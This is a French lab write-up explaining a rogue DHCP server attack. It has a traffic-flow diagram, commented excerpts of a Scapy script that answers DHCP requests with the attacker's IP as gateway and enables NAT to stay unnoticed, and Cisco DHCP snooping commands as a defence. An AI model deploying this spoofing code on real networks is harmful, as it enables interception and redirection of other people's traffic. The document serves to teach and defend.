# Rogue DHCP Server - Serveur DHCP Illégitime

## En quoi ça consiste

Le Rogue DHCP consiste à insérer un faux serveur DHCP sur le réseau. Quand une machine demande une IP (au démarrage ou via `dhclient`), le faux serveur répond en premier avec une configuration malveillante : sa propre IP comme gateway, ses propres DNS, etc.

### Principe

```
PHASE 1: La victime demande une IP

  VPC1 (pas d'IP)                    Vrai DHCP Server
       |                             192.168.189.1
       |  "J'ai besoin d'une IP!"        |
       |  (DHCP Discover - broadcast)    |
       |◄────────────────────────────────|
       |                                 |
       |  Rocky (Rogue DHCP)             |
       |  192.168.189.128                |
       |  "Tiens 192.168.189.60,         |
       |   gateway = MOI!"               |
       |  (Répond PLUS VITE)             |


PHASE 2: La victime accepte l'offre de Rocky

  VPC1 configure:
  - IP: 192.168.189.60
  - Gateway: 192.168.189.128 (ROCKY!)
  - DNS: 8.8.8.8


PHASE 3: Tout le trafic passe par Rocky

  VPC1 veut aller sur Internet
       |
       v
  Envoie à sa gateway = 192.168.189.128 (Rocky)
       |
       v
  [ Rocky voit TOUT le trafic ]
       |
       v
  Rocky peut:
  - Capturer les données
  - Rediriger vers un faux site
  - Bloquer l'accès
  - Modifier les DNS
```

### Résultat
- La victime configure sa gateway sur l'IP de l'attaquant
- Tout le trafic Internet de la victime passe par l'attaquant
- L'attaquant peut faire du MITM, du phishing DNS, etc.

## Explication du Code

### rogue_dhcp.py

```python
def setup_routing():
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system(f"iptables -t nat -A POSTROUTING -o {OUTBOUND_IF} -j MASQUERADE")
```
Active le forwarding IP et le NAT pour que les victimes aient internet en passant par Rocky (rend l'attaque indétectable).

```python
def handle_packet(pkt):
    if pkt.haslayer(DHCP):
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == 'message-type':
                msg_type = opt[1]
```
Écoute les paquets DHCP et identifie le type de message (Discover=1, Request=3).

```python
if msg_type == 1:  # DISCOVER -> OFFER
    offered_ip = f"192.168.189.{random.randint(50, 100)}"
    leases[mac] = offered_ip
```
Quand une victime demande une IP (Discover), on lui propose une IP dans notre range et on la stocke pour le ACK.

```python
pkt_offer = (
    Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(interface)) /
    IP(src="192.168.189.128", dst="255.255.255.255") /
    UDP(sport=67, dport=68) /
    BOOTP(op=2, yiaddr=offered_ip, siaddr="192.168.189.128", xid=xid, chaddr=mac) /
    DHCP(options=[
        ("message-type", "offer"),
        ("server_id", "192.168.189.128"),
        ("subnet_mask", "255.255.255.0"),
        ("router", "192.168.189.128"),
        ("name_server", "8.8.8.8"),
        ("lease_time", 3600),
        "end"
    ])
)
```
Construit l'offre DHCP :
- `op=2` = réponse BOOTP
- `xid=xid` = copie le transaction ID de la requête (sinon la victime ignore)
- `router` = notre IP (c'est là qu'on vole le trafic!)
- `yiaddr` = l'IP qu'on offre à la victime

```python
elif msg_type == 3:  # REQUEST -> ACK
    ip_to_assign = leases.get(mac, ...)
    pkt_ack = ...
    sendp(pkt_ack, ...)
```
Quand la victime accepte l'offre (Request), on envoie un ACK pour confirmer.

## Comment empêcher cette attaque

### Sur le switch Cisco (DHCP Snooping)
```
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 1
Switch(config)# interface Et0/3
Switch(config-if)# ip dhcp snooping trust
Switch(config-if)# exit
Switch(config)# interface Et0/2
Switch(config-if)# ip dhcp snooping limit rate 15
Switch(config-if)# exit
```

### Explication des commandes
- `ip dhcp snooping` : Active la fonctionnalité globalement
- `ip dhcp snooping trust` : Marque le port du VRAI serveur DHCP comme fiable
- `limit rate 15` : Limite les requêtes DHCP sur les ports non-trustés (empêche le flood)

### Sur les machines
- Configurer des IP statiques (pas de DHCP)
- Vérifier la gateway après chaque connexion réseau : `ip route show`
